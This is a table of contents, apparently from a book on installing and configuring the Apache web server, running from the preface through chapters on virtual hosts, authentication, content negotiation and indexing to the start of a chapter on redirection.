 
 

 
 
Copyright 
    
 
Preface 
       
 
Who Wrote Apache, and Why? 
       
 
The Demonstration Code 
       
 
Conventions Used in This Book  
       
 
Organization of This Book 
       
 
Acknowledgments 
    
    
 
Chapter 1.  Getting Started 
       
 
Section 1.1.  What Does a Web Server Do? 
       
 
Section 1.2.  How Apache Works 
       
 
Section 1.3.  Apache and Networking 
       
 
Section 1.4.  How HTTP Clients Work 
       
 
Section 1.5.  What Happens at the Server End? 
       
 
Section 1.6.  Planning the Apache Installation 
       
 
Section 1.7.  Windows? 
       
 
Section 1.8.  Which Apache? 
       
 
Section 1.9.  Installing Apache 
       
 
Section 1.10.  Building Apache 1.3.X Under Unix 
       
 
Section 1.11.  New Features in Apache v2 
       
 
Section 1.12.  Making and Installing Apache v2 Under Unix 
       
 
Section 1.13.  Apache Under Windows 
    
    
 
Chapter 2.  Configuring Apache: The First Steps 
       
 
Section 2.1.  What's Behind an Apache Web Site? 
       
 
Section 2.2.  site.toddle 
       
 
Section 2.3.  Setting Up a Unix Server  
       
 
Section 2.4.  Setting Up a Win32 Server 
       
 
Section 2.5.  Directives 
       
 
Section 2.6.  Shared Objects 
    
    
 
Chapter 3.  Toward a Real Web Site 
       
 
Section 3.1.  More and Better Web Sites: site.simple 
       
 
Section 3.2.  Butterthlies, Inc., Gets Going 
       
 
Section 3.3.  Block Directives 
       
 
Section 3.4.  Other Directives 
       
 
Section 3.5.  HTTP Response Headers 
       
 
Section 3.6.  Restarts 
       
 
Section 3.7.  .htaccess 
       
 
Section 3.8.  CERN Metafiles 
       
 
Section 3.9.  Expirations 
    
    
 
Chapter 4.  Virtual Hosts 
       
 
Section 4.1.  Two Sites and Apache 
       
 
Section 4.2.  Virtual Hosts 

       
 
Section 4.3.  Two Copies of Apache 
       
 
Section 4.4.  Dynamically Configured Virtual Hosting 
    
    
 
Chapter 5.  Authentication 
       
 
Section 5.1.  Authentication Protocol 
       
 
Section 5.2.  Authentication Directives 
       
 
Section 5.3.  Passwords Under Unix 
       
 
Section 5.4.  Passwords Under Win32 
       
 
Section 5.5.  Passwords over the Web 
       
 
Section 5.6.  From the Client's Point of View 
       
 
Section 5.7.  CGI Scripts 
       
 
Section 5.8.  Variations on a Theme 
       
 
Section 5.9.  Order, Allow, and Deny 
       
 
Section 5.10.  DBM Files on Unix 
       
 
Section 5.11.  Digest Authentication 
       
 
Section 5.12.  Anonymous Access 
       
 
Section 5.13.  Experiments 
       
 
Section 5.14.  Automatic User Information 
       
 
Section 5.15.  Using .htaccess Files 
       
 
Section 5.16.  Overrides 
    
    
 
Chapter 6.  Content Description and Modification 
       
 
Section 6.1.  MIME Types 
       
 
Section 6.2.  Content Negotiation 
       
 
Section 6.3.  Language Negotiation 
       
 
Section 6.4.  Type Maps 
       
 
Section 6.5.  Browsers and HTTP 1.1 
       
 
Section 6.6.  Filters 
    
    
 
Chapter 7.  Indexing 
       
 
Section 7.1.  Making Better Indexes in Apache 
       
 
Section 7.2.  Making Our Own Indexes 
       
 
Section 7.3.  Imagemaps 
       
 
Section 7.4.  Image Map Directives 
    
    
 
Chapter 8.  Redirection 
       
 
Section 8.1.  Alias 
       
 
